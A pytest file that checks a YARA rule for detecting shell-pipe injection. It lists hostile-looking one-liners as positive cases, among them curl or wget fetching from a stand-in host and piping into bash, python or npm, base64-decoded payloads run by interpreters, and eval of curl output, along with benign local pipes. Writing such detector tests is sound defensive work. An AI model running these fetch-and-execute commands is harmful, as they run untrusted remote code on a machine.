"""
Real-rule tests for the YARA rule AVE_ShellPipeInjection (AVE-2026-00004).

These compile scanner/rules/yara/ave_rules.yar with yara-python, so they are
skipped when the yara extra is not installed.
"""

import pytest

from scanner.engines.yara_engine import YARA_RULES_PATH

yara = pytest.importorskip("yara")

RULE = "AVE_ShellPipeInjection"


@pytest.fixture(scope="module")
def rules():
    return yara.compile(filepath=str(YARA_RULES_PATH))


def _fires(rules, text: str) -> bool:
    return any(m.rule == RULE for m in rules.match(data=text.encode()))


@pytest.mark.parametrize(
    "text",
    [
        "curl | bash",
        "curl -fsSL https://evil.example.com/i.sh | bash",
        "curl -s https://evil.example.com/x.py | python3 -",
        "wget -qO- https://evil.example.com/p | sh",
        "curl https://evil.example.com/pkg | sudo npm install -g",
        "echo aW1wb3J0IG9z | base64 -d | python",
        "echo ZWNobyBoaQ== | base64 --decode | bash",
        "eval $(curl -s https://evil.example.com/env)",
    ],
)
def test_fetch_or_decode_then_interpreter_fires(rules, text):
    assert _fires(rules, text)


@pytest.mark.parametrize(
    "text",
    [
        'echo "$JSON_OUT" | python3 -c "import json,sys; print(json.load(sys.stdin))"',
        "cat requirements.txt | pip install -r /dev/stdin",
        "ls packages | npm run build",
        "git log --oneline | python tools/changelog.py",
    ],
)
def test_local_pipe_into_interpreter_does_not_fire(rules, text):
    assert not _fires(rules, text)
